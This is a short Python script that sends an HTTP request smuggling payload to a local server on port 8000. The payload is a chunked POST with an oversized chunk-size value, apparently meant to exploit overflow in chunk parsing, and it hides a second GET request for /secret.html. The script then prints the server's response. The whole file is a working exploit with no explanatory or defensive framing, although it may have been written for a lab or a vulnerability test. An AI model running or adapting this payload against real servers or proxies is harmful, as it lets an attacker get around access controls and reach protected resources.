import socket

TARGET_HOST = '127.0.0.1'
TARGET_PORT = 8000 

smuggled_request = (
    "POST / HTTP/1.1\r\n"
    "Host: {target}\r\n"
    "Connection: keep-alive\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "f0000000000000003\r\n"
    "abc\r\n"
    "0\r\n\r\n"
    "GET /secret.html HTTP/1.1\r\n"
    "Host: {target}\r\n"
    "Connection: close\r\n\r\n"
    "0\r\n\r\n"
    "\r\n"
).format(target=TARGET_HOST)

def send_request():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((TARGET_HOST, TARGET_PORT))
        s.sendall(smuggled_request.encode())

        response = s.recv(4096)
        print(response.decode())

if __name__ == "__main__":
    send_request()
